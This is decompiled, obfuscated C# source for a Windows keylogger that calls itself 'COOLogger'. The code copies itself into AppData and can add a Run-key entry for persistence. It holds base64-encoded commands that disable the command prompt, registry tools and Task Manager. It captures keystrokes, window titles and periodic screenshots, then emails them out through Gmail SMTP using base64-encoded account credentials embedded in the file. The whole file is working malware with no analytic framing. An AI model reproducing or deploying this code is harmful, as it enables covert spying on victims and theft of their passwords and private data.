using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class dVuKCmUWqTYmwRe
{
	private static string SFfCBdKbOSrSdXp = "bGV3aXNoYWNrc0BnbWFpbC5jb20=";

	private static string mJfEvrEUjFsCZUx = "ZGl2aW5pdHkxNjkx";

	private static string zgBGODjrsqvTahL = "smtp.gmail.com";

	private static int YXnrulLaTDkmIko = 587;

	private static string VuKCmUWqTYmwReS;

	private static string FfCBdKbOSrSdXpm;

	private static string JfEvrEUjFsCZUxz;

	private static string gBGODjrsqvTahLY;

	private static string XnrulLaTDkmIkoD;

	private static string xmSbcafQJRuIHXb;

	private static int itnGpMvGMCNetBD = 600000;

	private static string JfrGnFquVJGzSPm = null;

	private static string RUXPnDvfOQkNSfp = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";

	private static string LYMxZvuWEVHLlLX = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static string RigDYwplwOcylvT = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static object DyhvVVvFRtNsQiI = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string MjeIKqwQYNsoonr = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage djqIihxnqiHkPNu = new MailMessage();

	private static SmtpClient BfPLzULBPZIIuhJ = new SmtpClient();

	[AccessedThroughProperty("lWRGaRIVgPOCnPl")]
	private static frGnFquVJGzSPmI _lWRGaRIVgPOCnPl;

	private static object pBETopyJEhwQjDx = Path.GetFileName(Application.get_ExecutablePath());

	private static RichTextBox XBfPLzULBPZIIuh = new RichTextBox();

	private static frGnFquVJGzSPmI lWRGaRIVgPOCnPl
	{
		get
		{
			return _lWRGaRIVgPOCnPl;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lWRGaRIVgPOCnPl != null)
			{
				frGnFquVJGzSPmI.KeyDown -= UXPnDvfOQkNSfpL;
			}
			_lWRGaRIVgPOCnPl = value;
			if (_lWRGaRIVgPOCnPl != null)
			{
				frGnFquVJGzSPmI.KeyDown += UXPnDvfOQkNSfpL;
			}
		}
	} = new frGnFquVJGzSPmI();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02da: Expected O, but got Unknown
		//IL_02fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0303: Expected O, but got Unknown
		xmSbcafQJRuIHXb = Conversions.ToString(true);
		JfEvrEUjFsCZUxz = Conversions.ToString(false);
		gBGODjrsqvTahLY = Conversions.ToString(false);
		XnrulLaTDkmIkoD = Conversions.ToString(false);
		FfCBdKbOSrSdXpm = Conversions.ToString(false);
		VuKCmUWqTYmwReS = Conversions.ToString(false);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, DyhvVVvFRtNsQiI, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(DyhvVVvFRtNsQiI, (object)"\\qxOooEtwoNqVTBp.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(MjeIKqwQYNsoonr + "\\qxOooEtwoNqVTBp.txt");
			streamWriter.Write(Application.get_ExecutablePath());
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(DyhvVVvFRtNsQiI, (object)"\\"), pBETopyJEhwQjDx))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(DyhvVVvFRtNsQiI, (object)"\\"), pBETopyJEhwQjDx)));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(DyhvVVvFRtNsQiI, (object)"\\"), pBETopyJEhwQjDx)));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(DyhvVVvFRtNsQiI, (object)"\\"), pBETopyJEhwQjDx)));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(DyhvVVvFRtNsQiI, (object)"\\"), pBETopyJEhwQjDx) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(VuKCmUWqTYmwReS))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(pBETopyJEhwQjDx)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(pBETopyJEhwQjDx), Operators.ConcatenateObject(Operators.ConcatenateObject(DyhvVVvFRtNsQiI, (object)"\\"), pBETopyJEhwQjDx));
			}
		}
		if (Conversions.ToBoolean(FfCBdKbOSrSdXpm))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(DyhvVVvFRtNsQiI, (object)"\\qxOooEtwoNqVTBp.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(JfEvrEUjFsCZUxz))
		{
			Interaction.Shell(YMxZvuWEVHLlLXR(RUXPnDvfOQkNSfp), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(gBGODjrsqvTahLY))
		{
			Interaction.Shell(YMxZvuWEVHLlLXR(LYMxZvuWEVHLlLX), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(XnrulLaTDkmIkoD))
		{
			Interaction.Shell(YMxZvuWEVHLlLXR(RigDYwplwOcylvT), (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(600000);
		val.add_Tick((EventHandler)xMtLwBbPNHZWsPn_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)spBETopyJEhwQjD_Ticked);
		val2.Start();
		lWRGaRIVgPOCnPl.gmiuxMhjsDxbqJd();
		Application.Run();
	}

	private static string DYZiHnRgNTmukQL()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string YMxZvuWEVHLlLXR(string FSRhknfFTMwegBd)
	{
		byte[] bytes = Convert.FromBase64String(FSRhknfFTMwegBd);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void xMtLwBbPNHZWsPn_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(xmSbcafQJRuIHXb))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = dwqgMVVUZKDKoCB(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(DyhvVVvFRtNsQiI, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(DyhvVVvFRtNsQiI, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(YMxZvuWEVHLlLXR(SFfCBdKbOSrSdXp));
				mailMessage.To.Add(YMxZvuWEVHLlLXR(SFfCBdKbOSrSdXp));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = XBfPLzULBPZIIuh.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(YMxZvuWEVHLlLXR(SFfCBdKbOSrSdXp), YMxZvuWEVHLlLXR(mJfEvrEUjFsCZUx));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				XBfPLzULBPZIIuh.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage mailMessage2 = djqIihxnqiHkPNu;
		mailMessage2.From = new MailAddress(YMxZvuWEVHLlLXR(SFfCBdKbOSrSdXp));
		mailMessage2.To.Add(YMxZvuWEVHLlLXR(SFfCBdKbOSrSdXp));
		mailMessage2.Subject = "COOLogger Logs from - " + Environment.UserName;
		mailMessage2.Body = XBfPLzULBPZIIuh.get_Text();
		mailMessage2 = null;
		SmtpClient bfPLzULBPZIIuhJ = BfPLzULBPZIIuhJ;
		bfPLzULBPZIIuhJ.Host = "smtp.gmail.com";
		bfPLzULBPZIIuhJ.Port = 587;
		bfPLzULBPZIIuhJ.EnableSsl = true;
		bfPLzULBPZIIuhJ.Credentials = new NetworkCredential(YMxZvuWEVHLlLXR(SFfCBdKbOSrSdXp), YMxZvuWEVHLlLXR(mJfEvrEUjFsCZUx));
		bfPLzULBPZIIuhJ.Send(djqIihxnqiHkPNu);
		bfPLzULBPZIIuhJ = null;
		XBfPLzULBPZIIuh.set_Text("");
	}

	public static void UXPnDvfOQkNSfpL(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox xBfPLzULBPZIIuh = XBfPLzULBPZIIuh;
		xBfPLzULBPZIIuh.set_Text(xBfPLzULBPZIIuh.get_Text() + lWRGaRIVgPOCnPl.wqgMVVUZKDKoCBR(e));
	}

	public static void spBETopyJEhwQjD_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(JfrGnFquVJGzSPm, DYZiHnRgNTmukQL(), false) != 0)
		{
			JfrGnFquVJGzSPm = DYZiHnRgNTmukQL();
			if (Operators.CompareString(JfrGnFquVJGzSPm, "", false) != 0)
			{
				RichTextBox xBfPLzULBPZIIuh = XBfPLzULBPZIIuh;
				xBfPLzULBPZIIuh.set_Text(xBfPLzULBPZIIuh.get_Text() + "\r\n\r\n~~~~~" + JfrGnFquVJGzSPm + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string dwqgMVVUZKDKoCB(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}
}
